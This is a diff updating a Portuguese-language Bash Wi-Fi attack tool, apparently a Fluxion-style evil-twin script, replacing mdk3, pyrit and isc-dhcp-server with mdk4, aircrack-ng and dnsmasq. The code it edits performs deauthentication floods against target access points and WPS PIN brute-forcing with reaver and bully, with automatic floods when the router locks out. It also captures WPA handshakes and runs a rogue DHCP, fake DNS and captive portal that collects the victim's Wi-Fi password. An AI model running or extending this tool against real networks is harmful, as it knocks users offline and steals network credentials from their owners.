@@ -133,7 +133,7 @@ function exitmode() {
     top
     echo -e "\n\n${white}[${red}-${white}] ${red}${general_exitmode}${transparent}"
 
-    for proc in aireplay-ng airodump-ng hostapd lighttpd dhcpd mdk3; do
+    for proc in aireplay-ng airodump-ng hostapd lighttpd dnsmasq mdk4; do
         if pgrep -x "$proc" &>/dev/null; then
             echo -e "${white}[${red}-${white}] ${white}Encerrando ${grey}${proc}${transparent}"
             killall "$proc" &>"$flux_output_device"
@@ -259,15 +259,14 @@ function checkdependences() {
     check_dep "awk"
     check_dep "bully"
     check_dep "curl"
-    check_dep "dhcpd"          "dhcpd"        "(isc-dhcp-server)"
+    check_dep "dnsmasq"        "dnsmasq"      "(dnsmasq)"
     check_dep "hostapd"
     check_dep "iwconfig"       "iwconfig"     "(wireless-tools)"
     check_dep "lighttpd"
     check_dep "macchanger"
-    check_dep "mdk3"
+    check_dep "mdk4"
     check_dep "nmap"
     check_dep "openssl"
-    check_dep "pyrit"
     check_dep "python3"
     check_dep "reaver"
     check_dep "rfkill"
@@ -290,7 +289,7 @@ function checkdependences() {
     if [ "$missing" = "1" ]; then
         echo
         echo -e "${red}Instale as dependências faltantes e tente novamente.${transparent}"
-        echo -e "${yellow}Dica (Parrot OS 7):${transparent} apt install aircrack-ng hostapd lighttpd isc-dhcp-server macchanger mdk3 reaver bully php8.2-cgi nmap pyrit rfkill binutils psmisc xterm zenity curl unzip"
+        echo -e "${yellow}Dica (Parrot OS 7):${transparent} apt install aircrack-ng hostapd lighttpd dnsmasq macchanger mdk4 reaver bully php8.2-cgi nmap rfkill binutils psmisc xterm zenity curl unzip hcxtools hashcat"
         exit 1
     fi
 
@@ -699,8 +698,8 @@ function wps() {
                 read -r d
                 case $d in
                     0) clear; top; wpsselection; enable_mon_mode "$WIFI_MONITOR1"; menu ;;
-                    1) timeout 20s mdk3 "$WIFI_MONITOR1" x 0 -t "$mac" -n "$ssid" -s 250; menu ;;
-                    2) timeout 60 mdk3 "$WIFI_MONITOR1" a -a "$mac" -m; menu ;;
+                    1) timeout 20s mdk4 "$WIFI_MONITOR1" e -t "$mac" -s 250; menu ;;  # mdk3 'x 0' (EAPOL-Start flood) -> mdk4 modo 'e'; validar em campo
+                    2) timeout 60 mdk4 "$WIFI_MONITOR1" a -a "$mac" -m; menu ;;
                     3) reaver -i "$WIFI_MONITOR1" -b "$mac" -c "$channel" -vv; menu ;;
                     4) xterm -e "wash --ignore-fcs -i $WIFI_MONITOR1" &
                        menu ;;
@@ -708,14 +707,14 @@ function wps() {
                        reaver_pid=$!
                        while kill -0 $reaver_pid 2>/dev/null; do
                            DETECT=$(awk '/./{line=$0}END{print line}' ReaverOutput.txt)
-                           [[ "$DETECT" == *"limiting"* ]] && mdk3 "$WIFI_MONITOR1" a -a "$mac" -m &
+                           [[ "$DETECT" == *"limiting"* ]] && mdk4 "$WIFI_MONITOR1" a -a "$mac" -m &
                            sleep 1
                        done; menu ;;
                     6) reaver -i "$WIFI_MONITOR1" -b "$mac" -c "$channel" -vv | tee ReaverOutput.txt &
                        reaver_pid=$!
                        while kill -0 $reaver_pid 2>/dev/null; do
                            DETECT=$(awk '/./{line=$0}END{print line}' ReaverOutput.txt)
-                           [[ "$DETECT" == *"limiting"* ]] && mdk3 "$WIFI_MONITOR1" x 0 -t "$mac" -n "$ssid" -s 250 &
+                           [[ "$DETECT" == *"limiting"* ]] && mdk4 "$WIFI_MONITOR1" e -t "$mac" -s 250 &  # mdk3 'x 0' -> mdk4 'e'; validar em campo
                            sleep 1
                        done; menu ;;
                     7) bully -b "$mac" -c "$channel" "$WIFI_MONITOR1"; menu ;;
@@ -723,7 +722,7 @@ function wps() {
                        bully_pid=$!
                        while kill -0 $bully_pid 2>/dev/null; do
                            DETECT=$(awk '/./{line=$0}END{print line}' BullyOutput.txt)
-                           [[ "$DETECT" == *"lockout"* ]] && mdk3 "$WIFI_MONITOR1" a -a "$mac" -m &
+                           [[ "$DETECT" == *"lockout"* ]] && mdk4 "$WIFI_MONITOR1" a -a "$mac" -m &
                            sleep 1
                        done; menu ;;
                     10) exitmode ;;
@@ -838,20 +837,16 @@ function handshakelocation() {
         deauthforce
     else
         if [ -f "$handshakeloc" ]; then
-            Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
-            Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
+            # pyrit foi removido dos repositórios; usa aircrack-ng para ler o .cap
+            local aircrack_info; aircrack_info=$(aircrack-ng "$handshakeloc" 2>/dev/null | grep -iE 'WPA|handshake' | head -1)
+            Host_MAC_loc=$(echo "$aircrack_info" | grep -oiE '([0-9A-F]{2}:){5}[0-9A-F]{2}' | head -1 | tr '[:lower:]' '[:upper:]')
+            Host_SSID_loc=$(echo "$aircrack_info" | sed -E 's/.*([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}[[:space:]]+//; s/[[:space:]]+WPA.*//')
             if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
                 if aircrack-ng "$handshakeloc" | grep -q "1 handshake"; then
                     cp "$handshakeloc" "$DUMP_PATH/$Host_MAC-01.cap"
                     webinterface
                 else
-                    echo -e "${yellow}Handshake corrompido.${transparent}"
-                    echo "Tentar com pyrit? [s/Enter=não]"; read -r resp
-                    if [ -n "$resp" ]; then
-                        if pyrit -r "$handshakeloc" analyze 2>&1 | grep -qi "good,"; then
-                            cp "$handshakeloc" "$DUMP_PATH/$Host_MAC-01.cap"; webinterface
-                        else echo "Corrompido."; sleep 2; handshakelocation; fi
-                    else handshakelocation; fi
+                    echo -e "${yellow}Handshake corrompido ou ausente.${transparent}"; sleep 2; handshakelocation
                 fi
             else
                 echo -e "${red}MAC/SSID não correspondem.${transparent}"; sleep 4; handshakelocation
@@ -867,7 +862,7 @@ function deauthforce() {
     while true; do
         echo -e "${red}[${yellow}i${red}]${transparent} $header_deauthforce"
         echo -e "      ${red}[${yellow}1${red}]${transparent} $deauthforce_option_1"
-        echo -e "      ${red}[${yellow}2${red}]${transparent} pyrit"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} Rígido (wpaclean + aircrack-ng)"
         echo -e "      ${red}[${yellow}3${red}]${transparent} $general_back"
         echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
         read -r yn
@@ -886,7 +881,7 @@ function askclientsel() {
         top
         echo -e "${red}[${yellow}i${red}]${transparent} $header_deauthMENU"
         echo -e "      ${red}[${yellow}1${red}]${transparent} Deauth all"
-        echo -e "      ${red}[${yellow}2${red}]${transparent} Deauth all [mdk3]"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} Deauth all [mdk4]"
         echo -e "      ${red}[${yellow}3${red}]${transparent} Deauth alvo específico"
         echo -e "      ${red}[${yellow}4${red}]${transparent} Rescanear redes"
         echo -e "      ${red}[${yellow}5${red}]${transparent} Sair"
@@ -894,7 +889,7 @@ function askclientsel() {
         read -r yn
         case $yn in
             1) deauth all; break ;;
-            2) deauth mdk3; break ;;
+            2) deauth mdk4; break ;;
             3) deauth esp; break ;;
             4) killall airodump-ng &>"$flux_output_device"; deltax; break ;;
             5) exitmode; break ;;
@@ -913,8 +908,8 @@ function deauth() {
             capture & $DEAUTH
             CSVDB=$Host_MAC-01.csv
             ;;
-        mdk3)
-            DEAUTH=deauthmdk3
+        mdk4)
+            DEAUTH=deauthmdk4
             capture & $DEAUTH &
             CSVDB=$Host_MAC-01.csv
             ;;
@@ -954,7 +949,7 @@ function deauthMENU() {
         case $yn in
             1) checkhandshake ;;
             2) conditional_clear; killall xterm &>"$flux_output_device"; askclientsel; break ;;
-            3) killall airodump-ng mdk3 aireplay-ng xterm &>"$flux_output_device"; CSVDB=dump-01.csv; killall xterm &>"$flux_output_device"; selection; break ;;
+            3) killall airodump-ng mdk4 aireplay-ng xterm &>"$flux_output_device"; CSVDB=dump-01.csv; killall xterm &>"$flux_output_device"; selection; break ;;
             4) exitmode; break ;;
             *) echo "$general_case_error"; conditional_clear ;;
         esac
@@ -975,17 +970,18 @@ function capture() {
 function checkhandshake() {
     if [ "$handshakemode" = "normal" ]; then
         if aircrack-ng "$DUMP_PATH/$Host_MAC-01.cap" | grep -q "1 handshake"; then
-            killall airodump-ng mdk3 aireplay-ng &>"$flux_output_device"
+            killall airodump-ng mdk4 aireplay-ng &>"$flux_output_device"
             wpaclean "$HANDSHAKE_PATH/${Host_SSID2}-${Host_MAC}.cap" "$DUMP_PATH/$Host_MAC-01.cap" &>"$flux_output_device"
             webinterface
         else
             Handshake_statuscheck="${red}Não Encontrado${transparent}"
         fi
     elif [ "$handshakemode" = "hard" ]; then
-        pyrit -r "$DUMP_PATH/$Host_MAC-01.cap" -o "$DUMP_PATH/test.cap" stripLive &>"$flux_output_device"
-        if pyrit -r "$DUMP_PATH/test.cap" analyze 2>&1 | grep -q "good,"; then
-            killall airodump-ng mdk3 aireplay-ng &>"$flux_output_device"
-            pyrit -r "$DUMP_PATH/test.cap" -o "$HANDSHAKE_PATH/${Host_SSID2}-${Host_MAC}.cap" strip &>"$flux_output_device"
+        # pyrit removido: wpaclean limpa/normaliza o .cap e aircrack-ng valida o handshake
+        wpaclean "$DUMP_PATH/test.cap" "$DUMP_PATH/$Host_MAC-01.cap" &>"$flux_output_device"
+        if aircrack-ng "$DUMP_PATH/test.cap" | grep -q "1 handshake"; then
+            killall airodump-ng mdk4 aireplay-ng &>"$flux_output_device"
+            wpaclean "$HANDSHAKE_PATH/${Host_SSID2}-${Host_MAC}.cap" "$DUMP_PATH/test.cap" &>"$flux_output_device"
             webinterface
         else
             if aircrack-ng "$DUMP_PATH/$Host_MAC-01.cap" | grep -q "1 handshake"; then
@@ -1126,20 +1122,18 @@ while (time() < $limit) {
 ?>
 PHPEOF
 
-    # Configuração DHCP
-    cat > "$DUMP_PATH/dhcpd.conf" <<EOF
-authoritative;
-default-lease-time 600;
-max-lease-time 7200;
-subnet ${RANG_IP}.0 netmask 255.255.255.0 {
-option broadcast-address ${RANG_IP}.255;
-option routers $IP;
-option subnet-mask 255.255.255.0;
-option domain-name-servers $IP;
-range ${RANG_IP}.100 ${RANG_IP}.250;
-}
+    # Configuração DHCP (dnsmasq — isc-dhcp-server foi descontinuado/EOL)
+    # port=0 desativa o DNS do dnsmasq: o fakedns (porta 53) cuida do DNS.
+    cat > "$DUMP_PATH/dnsmasq.conf" <<EOF
+port=0
+dhcp-authoritative
+dhcp-range=${RANG_IP}.100,${RANG_IP}.250,255.255.255.0,12h
+dhcp-option=3,$IP
+dhcp-option=6,$IP
+dhcp-leasefile=$DUMP_PATH/dnsmasq.leases
+log-dhcp
 EOF
-    touch "$DUMP_PATH/dhcpd.leases"
+    touch "$DUMP_PATH/dnsmasq.leases"
 
     # Configuração lighttpd com caminho php-cgi dinâmico
     cat > "$DUMP_PATH/lighttpd.conf" <<EOF
@@ -1256,23 +1250,23 @@ function attack() {
     routear &
     sleep 3
 
-    killall dhcpd &>"$flux_output_device"
+    killall dnsmasq &>"$flux_output_device"
     fuser -n tcp -k 53 67 80 &>"$flux_output_device"
     fuser -n udp -k 53 67 80 &>"$flux_output_device"
 
     xterm -bg black -fg green $TOPLEFT -T DHCP \
-        -e "dhcpd -d -f -lf \"$DUMP_PATH/dhcpd.leases\" -cf \"$DUMP_PATH/dhcpd.conf\" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
+        -e "dnsmasq -d -C \"$DUMP_PATH/dnsmasq.conf\" --interface=\"$interfaceroutear\" --bind-interfaces 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
 
     xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" \
         -e "python3 $DUMP_PATH/fakedns" &
 
     lighttpd -f "$DUMP_PATH/lighttpd.conf" &>"$flux_output_device"
 
-    killall aireplay-ng mdk3 &>"$flux_output_device"
-    echo "$Host_MAC" > "$DUMP_PATH/mdk3.txt"
+    killall aireplay-ng mdk4 &>"$flux_output_device"
+    echo "$Host_MAC" > "$DUMP_PATH/mdk4.txt"
     xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauth [mdk3] $Host_SSID" \
-        -e mdk3 "$WIFI_MONITOR" d -b "$DUMP_PATH/mdk3.txt" -c "$Host_CHAN" &
+        -title "Deauth [mdk4] $Host_SSID" \
+        -e mdk4 "$WIFI_MONITOR" d -b "$DUMP_PATH/mdk4.txt" -c "$Host_CHAN" &
 
     xterm -hold $TOPRIGHT -title "Informação do Alvo" -e "$DUMP_PATH/handcheck" &
     conditional_clear
@@ -1368,7 +1362,7 @@ clear
 echo "1" > $DUMP_PATH/status.txt
 sleep 5
 
-killall mdk3 aireplay-ng airbase-ng hostapd lighttpd dhcpd wpa_supplicant &>/dev/null
+killall mdk4 aireplay-ng airbase-ng hostapd lighttpd dnsmasq wpa_supplicant &>/dev/null
 pkill -f fakedns &>/dev/null
 
 SENHA=\$(cat $DUMP_PATH/data.txt)
@@ -1395,11 +1389,11 @@ function deauthall() {
         -e aireplay-ng --deauth "$DEAUTHTIME" -a "$Host_MAC" --ignore-negative-one "$WIFI_MONITOR" &
 }
 
-function deauthmdk3() {
-    echo "$Host_MAC" > "$DUMP_PATH/mdk3.txt"
+function deauthmdk4() {
+    echo "$Host_MAC" > "$DUMP_PATH/mdk4.txt"
     xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauth mdk3 em $Host_SSID" \
-        -e mdk3 "$WIFI_MONITOR" d -b "$DUMP_PATH/mdk3.txt" -c "$Host_CHAN" &
+        -title "Deauth mdk4 em $Host_SSID" \
+        -e mdk4 "$WIFI_MONITOR" d -b "$DUMP_PATH/mdk4.txt" -c "$Host_CHAN" &
 }
 
 function deauthesp() {
@@ -1410,7 +1404,7 @@ function deauthesp() {
 }
 
 function matartodo() {
-    killall aireplay-ng hostapd lighttpd dhcpd xterm &>"$flux_output_device"
+    killall aireplay-ng hostapd lighttpd dnsmasq xterm &>"$flux_output_device"
     pkill -f fakedns &>"$flux_output_device"
 }
 
